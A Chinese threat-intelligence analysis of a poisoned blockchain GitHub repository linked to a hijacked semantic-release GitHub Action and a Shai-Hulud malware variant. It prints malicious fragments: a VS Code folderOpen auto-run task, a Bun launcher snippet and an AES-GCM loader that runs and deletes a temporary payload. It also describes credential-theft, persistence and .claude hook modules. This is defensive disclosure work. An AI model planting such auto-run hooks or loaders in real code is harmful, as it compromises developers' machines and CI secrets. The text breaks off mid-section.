---
title: 威胁情报｜Verana Blockchain 代码仓库遭投毒分析
url: https://mp.weixin.qq.com/s/Ld2YD9Dhzglc9qTPm0ggxw
source: Doonsec's feed
date: 2026-06-26
fetch_date: 2026-06-27T05:45:48.328491
---

# 威胁情报｜Verana Blockchain 代码仓库遭投毒分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/8z8bibAexaCKiaiaCYLrXF92tiaBcvvzyj02I3d8BUaedsw1Tp37MJwaM4FTctEbcutRsWXSJqBMBnXrNqmNXWQbktHa5eejFYDGicZJRRP9wu78/0?wx_fmt=jpeg)

# 威胁情报｜Verana Blockchain 代码仓库遭投毒分析

原创

慢雾安全团队
慢雾安全团队

慢雾科技

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

********# 背景******

********#

近日，MistEye 在对一份来自 verana-labs/verana-blockchain 的 GitHub 仓库样本进行复核时，发现仓库的隐藏配置文件中内置了自动执行链，且关联构建日志直接命中了 2026 年 6 月 24 日被公开披露的 codfish/semantic-release-action 供应链事件。根据 Aikido 发布的分析报告，攻击者通过强制推送恶意提交并重指向版本标签，将 v2、v3、v4、v5 等常用标签劫持到恶意提交上，使引用这些标签的工作流在下一次运行时静默拉取并执行恶意代码。

本次样本的特殊之处在于，我们不仅发现了仓库内的后门代码，还获取到了该仓库某次真实构建的完整运行日志，日志中记录的执行步骤与 Aikido 披露的攻击手法完全吻合。此外，经静态解包交叉比对，样本的第二层载荷在行为和结构上与此前分析的 PyPI 恶意包（详见[《威胁情报｜从 Python 到 Bun：Shai-Hulud Hades 变种跨运行时攻击链分析》](https://mp.weixin.qq.com/s?__biz=MzU4ODQ3NTM2OA==&mid=2247505155&idx=1&sn=c7e75283dea7f30f070386750851bc28&scene=21#wechat_redirect)）一致，表明两者共享同一套后门框架。综合公开情报，该后门框架属于 Mini Shai-Hulud 恶意软件家族的 Miasma 变体，本次事件是该家族继 PyPI 投毒后向 GitHub Actions 供应链延伸的一次具体行动。本文聚焦于本次样本在开发者本地和 CI/CD 管道两侧的执行链、构建日志与公开事件的交叉印证，以及 index.js 载荷在令牌环境中的行为特征。文中涉及的部分工作流标识和样本路径已做脱敏处理。

# MistEye 响应********

********#

MistEye 是由 SlowMist 自主研发的 Web3 威胁情报与动态安全监控系统，集成了安全监控与情报聚合能力，为用户提供实时的风险预警与资产守护。

在捕获本次 GitHub 仓库样本及其关联构建日志后，MistEye 已完成对工作区自动执行链、GitHub Actions 运行链、静态解包层与公开供应链事件的交叉还原，并对相关恶意文件哈希、可疑工作流调用链和关联样本关系进行了归并。

情报详情：

![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/8z8bibAexaCLP0pNT6pHVIAolNXMPmjQOrVW0clNlAj5Rs6JRY60pUcf70XTjCdYCiansJbAaoEzIOTMtqoWMUqHZHQllZEmzfOJtf8icmNkQg/640?wx_fmt=png&from=appmsg)

#********

****# 工作区自动执行钩子：开发者打开仓库即触发****

********#

在分析 CI/CD 侧的供应链证据之前，需要先说明本次样本在开发者本地环境中的执行入口。这与前序 PyPI 变体利用 .pth 自动执行的做法一致，差异在于入口从 Python 解释器启动切换到了 IDE 的工作区钩子。

样本在仓库根目录的 .vscode 和 .claude 两个隐藏目录中分别部署了自动触发点。其中，.vscode/tasks.json → .claude/setup.mjs → .claude/index.js 这条链在当前样本中可以确认形成完整执行闭环。

VS Code：folderOpen 自动触发

.vscode/tasks.json 中定义了一个名为“Environment Setup”的 task：

```
{     "version": "2.0.0",     "tasks": [     {     "label": "Environment Setup",     "type": "shell",     "command": "node .claude/setup.mjs",     "runOptions": {     "runOn": "folderOpen"     }     ]  } }
```

"runOn": "folderOpen" 指示 VS Code 在打开该仓库文件夹时自动执行 node .claude/setup.mjs。需要注意，该行为依赖用户 VS Code 中已开启 task.allowAutomaticTasks 配置项（默认为 on），且用户在首次打开时未选择禁用自动任务。在此前提下，整个执行过程无需弹窗确认。

setup.mjs：跨平台 Bun 运行时下载器

.claude/setup.mjs 和 .vscode/setup.mjs 内容完全相同，是一份约 205 行的跨平台 Bun 运行时交付脚本，执行流程如下：

1. 检测本地是否已有 Bun（bun --version），若已存在则直接退出。

2. 识别当前平台与架构（Linux/macOS/Windows + x64/arm64），并对 musl libc（Alpine Linux）做特殊适配。

3. 从 https://github.com/oven-sh/bun/releases/download/bun-v1.3.14/ 下载对应平台的 Bun 二进制压缩包。

4. 解压 Bun 二进制（优先使用系统自带的 unzip 或 PowerShell，失败则退回纯 JavaScript ZIP 解压实现，最后兜底 npm install bun）。

5. 为 Bun 二进制赋予可执行权限，随后运行仓库内的 .claude/index.js。

```
 const ep = path.join(D, E);   // D = setup.mjs 所在目录, E = "index.js" ... execFileSync(bp, [ep], { stdio: "inherit", cwd: D, env });
```

完整感染链

将以上组件串联后，本地感染链如下：

开发者 git clone 仓库
│
└─ 用 VS Code 打开仓库
             │
             └─ tasks.json (folderOpen) → node .claude/setup.mjs
                                          │
                                          └─ 下载 Bun → bun run .claude/index.js

.claude/index.js 是本文后续分析的约 5.04 MB 混淆主载荷，通过多层解密将恶意逻辑写入 /tmp/p\*.js 并用 Bun 执行，执行后立即删除临时文件。

与此前 PyPI 变体对比，两者的感染手法一致：PyPI 变体用 .pth 在 Python 解释器启动时自动执行；本次样本则将入口前移到 VS Code 的工作区配置中，通过 folderOpen 机制在开发者打开仓库时自动触发后续执行链。

# 构建日志如何落证被劫持的 codfish/semantic-release-action********

********#

除本地入口外，本次样本还关联了一次真实的 GitHub Actions 构建，我们获取到了该次构建的完整日志，可以将其与前序事件分析和公开披露逐项对齐。

日志中关键的三条记录如下：

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCKJhnfXCicAICkVibSoj4o2zHXOqKTiaS6L7Y0XxUG8QVc3Y1B6aGGypJYB2OvVeEhEsicY7dxjdT13gMvrc7PbjOvl7eicUW9R1jdY/640?wx_fmt=png&from=appmsg)**

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCJetyHETzGBygicoicdia8C4CiaM30ReatDY6Epn8viaLROTISYEm6jzGzUenCtIy1Zdh6bd8Pp191xyTbU6GWHAe6ju70DEHgyy28A/640?wx_fmt=png&from=appmsg)**

这几行日志将三个步骤串成了一条完整的执行链：

第一步，命中恶意标签。

工作流引用的是浮动标签 @v3，GitHub 在运行时将其解析为具体提交 5792aba0e2180b9b80b77644370a6889d5817456。Aikido 的公开报告已将该提交列为恶意提交之一，对应 v3 系列标签。

第二步，恶意动作伪装正常执行。

日志随后又出现了一条下载记录，拉取了提交 8f9a58f2acdc190c356f79159b5de2548cdb63cd——一个干净的、未被篡改的版本。恶意 action.yml 的设计是：先调用真实 action 完成正常的语义化发布流程，待真实工作完成后再追加自己的载荷。从工作流面板上看，所有步骤均正常完成，不易触发异常告警。

第三步，借合法步骤补跑恶意载荷。

在真实 action 跑完之后，恶意配置通过 oven-sh/setup-bun 安装 Bun 运行时，再以 if: always() 触发 bun run $GITHUB\_ACTION\_PATH/index.js。if: always() 确保无论前置步骤是否成功，这段载荷都会被执行。

本次工作流已完整走到公开事件描述的最终执行点——不是仅仅引用了一个可疑仓库。

# index.js 的关键差异：从本地 IDE 钩子到 CI/CD 投放面********

********#

与前一篇 PyPI 文章相比，本次样本的关键变化不是“又一次使用了 Bun + 混淆 JavaScript”，而是为后门框架配置了本地 IDE 钩子和 GitHub Actions composite 包装两个入口，其中后者直接将载荷投放到了 CI/CD 凭据环境中。

第一个入口是上文详述的 VS Code folderOpen 工作区钩子，在开发者打开仓库时自动触发，与前序 PyPI 变体的 .pth 入口做法一致。第二个入口是 GitHub Action 的 composite 包装——恶意逻辑不再依赖用户安装 wheel 或显式导入模块，而是在 CI 任务中借语义化发布动作的正常运行上下文落地。此时它面对的不是普通开发者的本地环境，而是已持有 GITHUB\_TOKEN、可能持有 NPM\_TOKEN 且常常启用了 id-token: write 的发布 runner。

从首层静态解包结果看，当前样本的 index.js 仍沿用了“首层 loader 解密后写入 /tmp/p\*.js 再交给 Bun 执行”的框架：

```
  const _d=(k,i,a,c)=>{      const d=_c.createDecipheriv("aes-128-gcm",Buffer.from(k,"hex"),Buffer.from(i,"hex"),{authTagLength:16});      d.setAuthTag(Buffer.from(a,"hex"));      return Buffer.concat([d.update(Buffer.from(c,"hex")),d.final()]);  };
  const t="/tmp/p"+Math.random().toString(36).slice(2)+".js";  _fs.writeFileSync(t,_p);  if(typeof Bun!=="undefined"){    try{_cp.execSync('bun run "'+t+'"',{stdio:"inherit"})}    finally{try{_fs.unlinkSync(t)}catch{}}   }
```

需要特别说明的是，构建日志中的 bun run $GITHUB\_ACTION\_PATH/index.js 记录证明的是恶意载荷在 CI runner 中被执行，但这并不等于“这次执行现场生成了仓库里的 .vscode / .claude 文件”。相反，交叉比对显示，仓库内的 .vscode/tasks.json、.claude/settings.json 与 .claude/setup.mjs 分别与深层载荷内置的 asset16.s6.txt、asset14.F8.txt 与 asset10.K8.txt 完全一致，说明这些工作区文件本身就是该后门框架预打包的入口模板。换句话说，.vscode 和 .claude 更像是攻击者事先布置进恶意仓库的启动器，而不是本次 CI 执行后在现场临时生成的副产物。

为便于理解后续分析中出现的各类文件名，下面对 index.js 经逐层静态解包后产出的完整文件结构做统一说明。index.js 本身经过五层解包处理（charcode-rot → 两层 AES-GCM 解密 → obfuscator-strings → b5-strings），最终暴露出若干内嵌资产，每个资产对应一个独立的功能模块或配置模板：

|  |  |
| --- | --- |
| 解包产物 | 功能 |
| layer1.charcode-rot.js | 第一层解包：ROT6 字符偏移还原后的 loader 代码，包含 AES-128-GCM 解密逻辑与 /tmp/p\*.js 执行链 |
| layer2.aes-gcm-payload.js | 第二层解包：907 字节的 Bun 运行时下载器（与 bramin 变体共享的中继层，哈希完全一致） |
| layer3.aes-gcm-payload.js | 第三层解包：781,580 字节的主载荷密文解密产物 |
| layer4.obfuscator-strings.js | 第四层解包：字符串混淆还原后的可读代码 |
| layer5.b5-strings.js | 第五层解包：B5 编码字符串完全解码后的最终可读代码 |
| asset6.c6.txt | Python 更新器：通过 firedalazer 查询词搜索 GitHub commit，经 RSA-PSS 签名校验后下载执行下一阶段 Python 脚本 |
| asset7.M0.txt | 额外凭证采集模块 |
| asset8.p6.txt | Linux 平台进程内存读取模块 |
| asset9.d6.txt | GitHub Actions 工作流模板（deployment 触发器，将 secrets 导出为 artifact） |
| asset10.K8.txt | .claude/setup.mjs / .vscode/setup.mjs：跨平台 Bun 运行时下载器 |
| asset11.l6.txt | Python 更新器部署脚本：将 asset6 复制到 ~/.local/share/updater/update.py，注册 systemd --user 或 macOS LaunchAgent 持久化 |
| asset12.n6.txt | GitHub 令牌监测器：安装 ~/.local/bin/gh-token-monitor.sh，60 秒轮询 GitHub API 检测令牌状态，令牌失效时触发预设 handler |
| asset13.i6.txt | RSA 公钥（C2 签名验证）：用于 thebeautifulsnadsoftime 通道的命令签名校验 |
| asset14.F8.txt | .claude/settings.json 模板：SessionStart 钩子配置 |
| asset15.o6.txt | RSA 公钥（数据加密）：用于 createEnvelope 的 RSA-OAEP 外传数据加密封装 |
| asset16.s6.txt | .vscode/tasks.json 模板：folderOpen 自动触发 task 配置 |
| asset17.r6.txt | **Bash 版 Bun 运行时下载器，入口为 `ai\_init.js`** |
| asset18.a6.txt | **GitHub Actions 工作流模板（push 触发器，将 secrets 导出为 artifact）** |

真正值得关注的是感染后的实际落地点。继续沿着 index.js 解出的深层资产往下看，可以发现这套样本在执行后的主要落地位置并不在仓库工作区，而在用户目录和系统持久化机制中。也就是说，工作区钩子负责把后门拉起来，真正的长期驻留和后续控制则由执行后释放的监测器承担。

这一段的写法与前序样本一致，差异在于二阶段解包后的主体载荷。与此前更偏本地开发环境和包管理器凭据搜集的变体相比，本次 index.js 的深层代码同样包含了对 GitHub Actions 场景的适配能力——与此前 PyPI 变体在深层后渗透资产层面共享同一框架，差异在于入口从 .pth 切换到了 composite action，使其在 CI runner 中直接执行。具体体现在以下特征上。

代理与 Runner 环境适配

深层解包层中存在对 HTTP\_PROXY、HTTPS\_PROXY、http\_proxy、https\_proxy 四种环境变量写法的补齐逻辑，说明作者考虑了企业网络与 CI runner 中常见的代理场景，而非仅面向开发者本机的直连网络环境。

对 GitHub 仓库上下文与种子令牌的判断

代码中存在 GITHUB\_REPOSITORY 与 SEED\_PAT 判断逻辑：当运行环境满足特定仓库上下文时，载荷会将种子令牌加入后续执行路径；若主流程失败，则退回到更激进的令牌处理逻辑。这表明该样本会根据仓库和令牌状态动态决定后续利用方式，而非仅做静态窃取。

针对发布链的能力模块
...